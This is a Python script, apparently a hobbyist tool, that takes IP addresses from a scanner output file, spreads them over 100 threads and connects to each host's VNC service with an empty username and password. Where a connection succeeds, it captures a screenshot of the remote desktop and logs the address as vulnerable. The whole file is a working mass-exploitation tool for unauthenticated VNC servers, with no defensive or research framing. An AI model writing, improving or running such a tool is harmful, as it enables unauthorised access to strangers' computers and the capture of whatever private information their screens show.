import os
import time
from vncapi import api
import os.path
import threading
from filelock import FileLock

def attemptConnect(ips):
     for ip in ips:
        try:
            with open('nonVulnerableIPs.txt') as f: #if it has already not been found
                if ip not in f.read():
                    client = api.connect('{ip}:0'.format(ip=ip),timeout=10, username='', password='')
                    client.captureScreen('screenshot_IP_{ip}.png'.format(ip=ip))
                    print('Got image from {ip}'.format(ip=ip))
                    #TODO: issue with filelock and appending.
                    #TODO: see: https://stackoverflow.com/questions/58028033/how-to-append-text-into-file-when-using-filelock-acquire-function-python
                    with FileLock("vulnerableIPs.txt.lock"):
                            with open('vulnerableIPs.txt', "a") as file:
                                file.write(ip + "\n")
        except:
            print('Cant get image from {ip}'.format(ip=ip))
            #TODO add ability to edit "open" to "close" so as to not re-read the line
            with FileLock("nonVulnerableIPs.txt.lock"):
                    with open('nonVulnerableIPs.txt', "a") as file:
                        file.write(ip + "\n")
                        pass

def createThread(maxThreads, ips):
        currentIndex = 0
        ipThreadGap = len(ips) // maxThreads
        nextIndex = ipThreadGap
        #the index will be the thread number. the list will contain the ips it has to solve
        ips_to_solve = []
        for i in range(0, maxThreads):
            temp = []
            for x in range(currentIndex, nextIndex): #TODO: simplify with a range(0, ipThreadGap) and use current and next within the loop
                temp.append(ips[x])
            ips_to_solve.append(temp)
            currentIndex += ipThreadGap
            nextIndex += ipThreadGap 
        return ips_to_solve

def main():
    #TODO: limit amount of threads multithreading
    if os.path.isfile('ips.txt'):
        print('List of ips detected.')
        with open('ips.txt') as f:
            lines = f.readlines() # list containing lines of file
            ips = []
            for line in lines:
                parsedLine = line.split(" ")
                try:
                    ips.append(parsedLine[3])
                except:
                    print("The following line does not work. Skipping line:")
                    print(line)
                    print("")
            print("Done. Proceeding with screenshotting: ")

            maxThreads = 100
            ips_to_multithread = createThread(maxThreads, ips)

            for i in range(0, maxThreads):
                thread = threading.Thread(target=attemptConnect, kwargs={'ips':ips_to_multithread[i]})
                thread.start()


if __name__ == '__main__':
    #if os.geteuid() != 0:
        #exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")
    main()
